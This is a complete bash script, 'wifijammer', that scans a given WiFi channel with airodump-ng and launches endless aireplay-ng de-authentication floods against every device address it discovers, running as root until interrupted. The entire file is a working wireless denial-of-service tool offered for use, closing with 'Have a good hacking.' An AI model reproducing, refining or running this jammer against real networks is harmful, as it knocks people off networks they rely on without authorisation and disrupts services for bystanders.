#!/bin/bash

VERSION=1.0

HELP="wifijammer, version $VERSION\n
Usage: $0 -i [mon iface] -c [channel]\n\n
This is a bash based WiFi jammer. It uses your\n
monitor mode interface to continuously send de-authenticate\n
packets to every client on a specified channel.\n
This program needs the aircrack-ng suit to function and a\n
WiFi card in monitor mode.\n\n
Options:\n
\tRequired:\n
\t-i\tmonitor mode interface\n
\t-c\tchannel to scan	\n\n
\tOptional:\n
\t-h\tdisplay help message\n
\t-v\tdisplay version\n\n
Example: $0 -i mon0 -c 2\n\n
Based on esmith2000@gmail.com [ at http://code.google.com/p/wifijammer ] original script."

DIR="$( cd "$( dirname "$0" )" && pwd )"

trap ctrl_c INT
function ctrl_c() {
	echo "!"
	echo "Killing aireplay-ng processes..."
	pgrep -l aireplay-ng
	pkill -f aireplay-ng
	echo "Done."
	echo "Removing files..."
	cd $DIR
	rm -rf monifacejammerairodumpoutput*
	rm -rf stationlist
	echo "Done. Have a good hacking."
	exit
}

while getopts "i:c:hv" OPTION; do
	case "$OPTION" in
		i)
			MONIFACE=$OPTARG
			;;
		c)
			NUMBER=$OPTARG
			;;
		h)
			echo -e $HELP
			exit 1
			;;
		v)
			echo "$0, version $VERSION"
			exit 1
			;;
	esac
done

if [[ $# -lt 1 ]]; then
	echo -e $HELP
	exit 1
fi
if [[ $MONIFACE == "" ]]; then
	echo "You must specify the -i option!"
	exit 1
fi
if [[ $NUMBER == "" ]]; then
	echo "You must specify a channel with the -c option!"
	exit 1
fi
if [ x"`which id 2> /dev/null`" != "x" ]; then
	USERID="`id -u 2> /dev/null`"
fi
if [ x$USERID = "x" -a x$UID != "x" ]; then
	USERID=$UID
fi
if [ x$USERID != "x" -a x$USERID != "x0" ]; then
	echo "Run it as root" ; exit ;
fi

echo "Changing working directory to the same as this script..."
cd $DIR
echo "The curent directory is : [ $DIR ]."

rm -rf monifacejammerairodumpoutput*
rm -rf stationlist

echo "Scanning specified channel..."
airodump-ng -c $NUMBER -w monifacejammerairodumpoutput $MONIFACE &> /dev/tty2 &
mkdir stationlist
while [ x1 ]; do
	sleep 5s
	cat monifacejammerairodumpoutput*.csv|while read LINE01 ; do
		echo "$LINE01" > tempLINE01
		LINE=`echo $LINE01|cut -f 1 -d ,|tr -d [:space:]`
		rm tempLINE01
		if [ x"$LINE" != x"Jamming discovered devices. Nothing new here..." ];then
			if [ x"$LINE" = x"StationMAC" ];then
				start="no"
			fi
			if [ x"$start" = x"yes" ];then
				if [ -e stationlist/"$LINE".txt ];then
					echo "Jamming discovered devices. Nothing new here..."
				else
					echo "Good, new device found : [ $LINE - at $MONIFACE monitor mode interface ]."
					aireplay-ng --deauth 0 -a $LINE $MONIFACE &> /dev/tty2 &
					echo "$LINE" > stationlist/$LINE.txt
				fi
			fi
			if [ x"$LINE" = x"BSSID" ];then
				start="yes"
			fi
		fi
	done
done
